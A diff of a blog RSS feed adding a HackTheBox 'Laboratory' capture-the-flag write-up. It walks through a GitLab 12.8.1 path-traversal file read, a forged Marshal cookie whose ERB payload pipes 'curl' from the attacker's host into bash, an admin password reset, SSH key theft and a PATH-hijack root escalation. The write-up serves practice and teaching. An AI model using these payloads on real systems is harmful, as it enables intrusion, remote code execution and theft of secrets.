@@ -5,12 +5,196 @@
     <link>https://mohamed-elleuch.me/writeups/</link>
       <atom:link href="https://mohamed-elleuch.me/writeups/index.xml" rel="self" type="application/rss+xml" />
     <description>Posts</description>
-    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 27 Mar 2021 00:00:00 +0000</lastBuildDate>
+    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 17 Apr 2021 00:00:00 +0000</lastBuildDate>
     <image>
       <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png</url>
       <title>Posts</title>
       <link>https://mohamed-elleuch.me/writeups/</link>
     </image>
+    
+    <item>
+      <title>HackTheBox - Laboratory Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-laboratory/</link>
+      <pubDate>Sat, 17 Apr 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-laboratory/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.216 -v
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
+|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
+|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.41
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to https://laboratory.htb/
+443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: The Laboratory
+| ssl-cert: Subject: commonName=laboratory.htb
+| Subject Alternative Name: DNS:git.laboratory.htb
+| Issuer: commonName=laboratory.htb
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-07-05T10:39:28
+| Not valid after:  2024-03-03T10:39:28
+| MD5:   2873 91a5 5022 f323 4b95 df98 b61a eb6c
+|_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca
+| tls-alpn: 
+|_  http/1.1
+Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We have 3 ports open:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ssh: 22 running OpenSSH 8.2p1&lt;/li&gt;
+&lt;li&gt;http: 80 running Apache httpd 2.4.41&lt;/li&gt;
+&lt;li&gt;https: 443 running Apache httpd 2.4.41&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;2 Domains:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;laboratory.htb&lt;/li&gt;
+&lt;li&gt;git.laboratory.htb&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreenweb-enumerationp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enumeration&lt;/p&gt;&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;After adding laboratory.htb &amp;amp; git.laboratory.htb to /etc/hosts&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Let&amp;rsquo;s check laboratory.htb first&lt;/p&gt;
+&lt;img src=&#34;users.png&#34;&gt;
+&lt;p&gt;We got 2 usernames:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Dexter&lt;/li&gt;
+&lt;li&gt;DeeDee Dee_Dee ..&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Skipping Gobuster scans, as it gave me nothing interesting&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Seems like it&amp;rsquo;s a static website, nothing much to see!&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s move to git.laboratory.htb&lt;/p&gt;
+&lt;img src=&#34;gitlab.png&#34;&gt;
+&lt;p&gt;Tried few logins but it failed, ( dexter:admin dexter:password )&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s create our own account and see what we can do&lt;/p&gt;
+&lt;img src=&#34;reg.png&#34;&gt;
+&lt;p&gt;&lt;code&gt;GitLab Community Edition 12.8.1&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;git_ver.png&#34;&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorredinitial-foothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Initial foothold &lt;/p&gt;&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;I think there are ready-to-use scripts to exploit this gitlab version, but we&amp;rsquo;ll do the process manually!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Bascially we&amp;rsquo;re gonna abuse arbitrary file read via the UploadsRewriter when moving an issue, and get the &lt;code&gt;secret_key_base&lt;/code&gt; from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml then generate the cookie payload via our own gitlab instance with the key that we got!&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;If you wanna read more about this exploit: &lt;a href=&#34;https://hackerone.com/reports/827052&#34;&gt;https://hackerone.com/reports/827052&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Let&amp;rsquo;s now try to read /etc/passwd from the box&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Let&amp;rsquo;s first create 2 projects&lt;/li&gt;
+&lt;/ul&gt;
+&lt;img src=&#34;pro.png&#34;&gt;
+&lt;ul&gt;
+&lt;li&gt;Let&amp;rsquo;s let&amp;rsquo;s an issue in one of these projets containing&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;passwd.png&#34;&gt;
+&lt;ul&gt;
+&lt;li&gt;Let&amp;rsquo;s now move it to the other project&lt;/li&gt;
+&lt;/ul&gt;
+&lt;img src=&#34;move.png&#34;&gt;
+&lt;img src=&#34;passwd1.png&#34;&gt;
+And we get the file!
+&lt;img src=&#34;passwd2.png&#34;&gt;
+&lt;p&gt;Now let&amp;rsquo;s repeat the same thing to get /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;secret.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s now setup our gitlab env!&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;You can either download the gitlab package or use docker&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;For this, I am going to use docker! First let&amp;rsquo;s pull the image&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo docker -D pull gitlab/gitlab-ce:12.8.1-ce.0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;then run it !&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo docker run -it gitlab/gitlab-ce:12.8.1-ce.0 sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;docker.png&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;PS: &lt;code&gt;id&lt;/code&gt; command ; force of habit xD&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Let&amp;rsquo;s run&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gitlab-ctl reconfigure
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s change the /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml file with the one that we got!
+Now, let&amp;rsquo;s run&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gitlab-ctl restart
+gitlab-rails console
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here in the console, we&amp;rsquo;ll craft our cookie to gain access!&lt;/p&gt;
+&lt;p&gt;Our payload to craft it:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env[&amp;quot;action_dispatch.cookies_serializer&amp;quot;] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new(&amp;quot;&amp;lt;%= `curl http://10.10.14.3:8000/shell | bash` %&amp;gt;&amp;quot;) 
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &amp;quot;@result&amp;quot;, ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;cookie.png&#34;&gt;
+&lt;p&gt;Final payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -vvv &#39;https://git.laboratory.htb/users/sign_in&#39; -b &amp;quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiaCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4zOjgwMDAvc2hlbGwgfCBzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--a9181bfd8d26c33c9cf0c6fedcff269a3685902b&amp;quot; -k
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s set a listener, and grab that shell&lt;/p&gt;
+&lt;img src=&#34;foothold.png&#34;&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorreduser-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User PrivEsc &lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;So now we&amp;rsquo;re on a docker container as the &lt;strong&gt;git&lt;/strong&gt; user!
+The trick now is to change the gitlab&amp;rsquo;s admin (Which is id=1) password
+Going through gitlab&amp;rsquo;s docs to get the right syntax
+&lt;a href=&#34;https://docs.gitlab.com/ee/security/reset_user_password.html&#34;&gt;https://docs.gitlab.com/ee/security/reset_user_password.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;It may take a while to run&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gitlab-rails console -e production
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;user = User.find(1)
+user.password = &#39;password123&#39;
+user.password_confirmation = &#39;password123&#39;
+user.save!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;dexterpass.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s login now with his account&lt;/p&gt;
+&lt;img src=&#34;projects.png&#34;&gt;
+&lt;p&gt;There is a private repo that contains his home directory backup!&lt;/p&gt;
+&lt;img src=&#34;ssh.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s copy his ssh private key and get into the box!&lt;/p&gt;
+&lt;img src=&#34;user.png&#34;&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorredroot-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root PrivEsc &lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s first run Linpeas!
+Going through the output, we can see that there is unusual suid binary
+&lt;img src=&#34;suid.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;let&amp;rsquo;s run Ltrace on this binary&lt;/p&gt;
+&lt;img src=&#34;ltrace.png&#34;&gt;
+&lt;p&gt;We can abuse this binary, by creating a fake malicious chmod binary&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;quot;/bin/bash -p&amp;quot; &amp;gt; /tmp/chmod
+chmod 777 /tmp/chmod
+export PATH=/tmp:$PATH
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then we run the binary!&lt;/p&gt;
+&lt;img src=&#34;root.png&#34;&gt;
+And we rooted the box!
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
     
     <item>
       <title>HackTheBox - Luanne Writeup</title>
